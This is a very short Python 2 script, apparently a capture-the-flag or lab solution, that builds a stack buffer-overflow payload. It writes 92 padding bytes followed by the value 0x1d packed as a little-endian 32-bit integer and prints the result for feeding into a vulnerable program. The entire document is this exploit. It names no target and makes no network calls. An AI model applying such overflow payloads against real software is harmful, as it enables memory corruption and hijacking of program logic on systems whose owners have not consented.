import struct

def conv(x):
    return struct.pack("<I",x)

payload = "A" * 92 + conv(0x1d)
print payload
